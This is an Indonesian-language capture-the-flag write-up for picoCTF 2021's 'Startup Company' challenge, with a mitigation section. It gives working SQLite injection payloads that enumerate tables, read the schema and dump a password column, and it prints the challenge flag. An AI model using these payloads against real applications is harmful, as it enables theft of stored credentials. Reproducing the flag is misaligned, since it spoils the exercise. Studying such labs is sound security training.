# Writeup: Startup Company (Challenge ID: 108)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / SQL Injection (SQLite)
- **Difficulty:** Easy
- **Event:** picoCTF 2021
- **Flag:** `academy{1_c4nn0t_s33_y0u_66b27680}`

---

## Problem Statement & Scope
Aplikasi "Generic Startup Name" menerima donasi setelah login. Form kontribusi
(`moneys` + `captcha` dinamis → `POST /contribute.php` → redirect 302 ke
`/index.php`) merefleksikan `You're latest contribution: $<nilai>`. Nilai
tersebut diinterpolasi ke query SQLite dalam tanda kutip — injeksi klasik.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **SQL injection via string interpolation:** input `moneys` digabung langsung
   ke query (`... SET ... = '<input>'`). Keluar dari kutip dengan `'`,
   sambung ekspresi via operator konkatenasi SQLite `||`, komentar sisanya
   dengan `-- -`.
2. **Reflected exfiltration:** hasil ekspresi tampil di halaman index, sehingga
   `GROUP_CONCAT(wordpass)` langsung membocorkan flag tanpa blind-orakel.
3. **Captcha hanya anti-bot, bukan anti-injeksi:** nilai captcha fresh dibaca
   dari tiap halaman login, lalu dipakai ulang pada request injeksi berikutnya.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. `POST /register.php` (`user`, `pass`) → buat akun; `POST /index.php`
   → login (cookie `PHPSESSID`).
2. Scrape `name="captcha" value="N"` dari halaman login.
3. `POST /contribute.php` (`moneys=1' || (SELECT sqlite_version()) -- -`,
   `captcha=N`) → refleksi `$13.46.1` — injeksi terkonfirmasi (SQLite 3.46.1).
4. `1' || (SELECT GROUP_CONCAT(tbl_name) FROM sqlite_master) -- -`
   → tabel `startup_users`.
5. `1' || (SELECT sql FROM sqlite_master WHERE name='startup_users') -- -`
   → skema `(nameuser text, wordpass text, money int)`.
6. `1' || (SELECT GROUP_CONCAT(wordpass) FROM startup_users) -- -`
   → `password,not_the_flag_*,academy{1_c4nn0t_s33_y0u_66b27680},...`.
7. Submit via API → `{"correct": true}` (HTTP 201).

---

## Flag & Verifikasi
- **Flag:** `academy{1_c4nn0t_s33_y0u_66b27680}`
- **Verifikasi:** POST `/api/submissions/` mengembalikan `{"correct": true}`
  (HTTP 201); `solved_by_user: true` pada `GET /api/challenges/108/`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Prepared statements / parameter binding** — jangan pernah interpolasi input
  ke SQL, walau input `type="number"` (bypass trivial via curl/DevTools).
- **Least-privilege DB + output encoding:** kolom rahasia (`wordpass`) jangan
  satu tabel dengan kolom reflektif; jangan echo hasil query mentah ke HTML.
- Pola `||` + `sqlite_master` + `GROUP_CONCAT` adalah pola wajib LKS untuk
  semua tantangan SQLite-injection.

---

## Solver
Lihat `scripts/solve_108_startup_company.py <base-url> [user] [pass]` —
register, login, scrape captcha fresh per injeksi, dump `wordpass`, cetak flag.
